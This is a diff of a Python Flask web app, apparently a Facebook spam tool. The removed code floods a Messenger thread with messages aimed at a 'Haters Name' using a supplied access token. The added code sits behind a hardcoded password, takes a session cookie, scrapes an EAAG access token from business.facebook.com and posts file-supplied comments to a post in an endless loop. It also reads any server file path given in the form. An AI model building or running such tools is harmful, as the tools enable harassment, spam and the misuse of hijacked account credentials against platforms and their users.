@@ -1,124 +1,90 @@
-from flask import Flask, request
+from flask import Flask, render_template, request, redirect, url_for
 import requests
-import os
-from time import sleep
+import re
 import time
-from datetime import datetime
-app = Flask(__name__)
-app.debug = True
+import os
 
-headers = {
-    'Connection': 'keep-alive',
-    'Cache-Control': 'max-age=0',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
-}
+app = Flask(__name__)
+
+def make_request(url, headers, cookies):
+    try:
+        response = requests.get(url, headers=headers, cookies=cookies).text
+        return response
+    except requests.RequestException as e:
+        return str(e)
 
 @app.route('/', methods=['GET', 'POST'])
-def send_message():
+def index():
     if request.method == 'POST':
-        access_token = request.form.get('accessToken')
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
+        password = request.form['password']
+        if password == "ArYan":
+            return redirect(url_for('dashboard'))
+        else:
+            return render_template('index.html', error="Incorrect Password! Try again.")
+    return render_template('index.html')
 
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
+@app.route('/dashboard', methods=['GET', 'POST'])
+def dashboard():
+    if request.method == 'POST':
+        cookies = request.form['cookie']
+        id_post = request.form['post_id']
+        commenter_name = request.form['commenter_name']
+        delay = int(request.form['delay'])
+        comment_file_path = request.form['comment_file_path']
+
+        response = make_request('https://business.facebook.com/business_locations', headers={
+            'Cookie': cookies,
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]'
+        }, cookies={'Cookie': cookies})
+
+        if response is None:
+            return render_template('dashboard.html', error="Error making initial request")
+
+        try:
+            token_eaag = re.search('(EAAG\w+)', str(response)).group(1)
+        except AttributeError:
+            return render_template('dashboard.html', error="Token not found in response")
+
+        with open(comment_file_path, 'r') as file:
+            comments = file.readlines()
+
+        x, y = 0, 0
+        results = []
 
         while True:
             try:
-                for message1 in messages:
-                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                    message = str(mn) + ' ' + message1
-                    parameters = {'access_token': access_token, 'message': message}
-                    response = requests.post(api_url, data=parameters, headers=headers)
-                    if response.status_code == 200:
-                        print(f"┌─[─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ + ]──► : : {message}")
-                    else:
-                        print(f"┌─[─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ - ]──► : : {message}")
-                    time.sleep(time_interval)
-            except Exception as e:
-                print(f"Error while sending message using token {access_token}: {message}")
-                print(e)
-                time.sleep(30)
+                time.sleep(delay)
+                teks = comments[x].strip()
+                comment_with_name = f"{commenter_name}: {teks}"
+                data = {
+                    'message': comment_with_name,
+                    'access_token': token_eaag
+                }
+                response2 = requests.post(f'https://graph.facebook.com/{id_post}/comments/', data=data, cookies={'Cookie': cookies}).json()
+                if '\'id\':' in str(response2):
+                    results.append({
+                        'post_id': id_post,
+                        'datetime': time.strftime("%Y-%m-%d %H:%M:%S"),
+                        'comment': comment_with_name,
+                        'status': 'Success'
+                    })
+                    x = (x + 1) % len(comments)
+                else:
+                    y += 1
+                    results.append({
+                        'status': 'Failure',
+                        'post_id': id_post,
+                        'comment': comment_with_name,
+                        'link': f"https://m.basic.facebook.com//{id_post}"
+                    })
+            except requests.RequestException as e:
+                results.append({'status': 'Error', 'message': str(e)})
+                time.sleep(5.5)
+                continue
 
+        return render_template('dashboard.html', results=results)
 
-    return '''
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Sonu InSiDe❤️</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
-  <style>
-    body{
-      background-image: url('https://i.ibb.co/yh8yfFT/d9c6faa3a372422abfd28049e32ba317.jpg');
-    }
-    .container{
-      max-width: 300px;
-      background-position: center;
-                color: white;
-      border-radius: 10px;
-      padding: 20px;
-      box-shadow: 0 0 10px rgba(red, green, blue, alpha);
-      margin: 0 auto;
-      margin-top: 20px;
-    }
-    .header{
-      text-align: center;
-      padding-bottom: 50px;
-    }
-    .btn-submit{
-      width: 100%;
-      margin-top: 10px;
-    }
-    .footer{
-      text-align: center;
-      margin-top: 10px;
-      color: blue;
-    }
-  </style>
-</head>
-<body>
-  <header class="header mt-4">
-    <h1 class="mb-3" style="color: yellow"> 🖤" __[ WELCOME � :D <(")
-    >3:)
-<h1 class="mb-3" style="color: red"> TO 😈 SONU SERVER 😈
-<h1 class="mb-3" style="color: blue"> |[---» DARK WEB 🖤</h1>
-  </header>
-
-  <div class="container">
-    <form action="/" method="post" enctype="multipart/form-data">
-      <input type="text" name="accessToken" placeholder="Access Token"required><br>
-      </div>
-     <input type="text" name="threadId" placeholder="Convo Group/Inbox ID"required><br>
-      </div>
-     <input type="text" name="kidx" placeholder="Haters Name"required><br>
-      </div>
-        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
-      </div>
-     <input type="text" name="60" placeholder="Time"required><br>
-      </div>
-      <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
-    </form>
-  </div>
-  <footer class="footer" style="color: yellow;">
-    <p>&copy; Developed by Feelingless .</p>
-    <p>Convo Group/Inbox Loader Tool</p>
-    <p>Keep enjoying  <a href="https://github.com/zeeshanqureshi0</a></p>
-  </footer>
-</body>
-  </html>
-    '''
-
+    return render_template('dashboard.html')
 
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
-    app.run(debug=True)
+    app.run(host='0.0.0.0', port=5000)
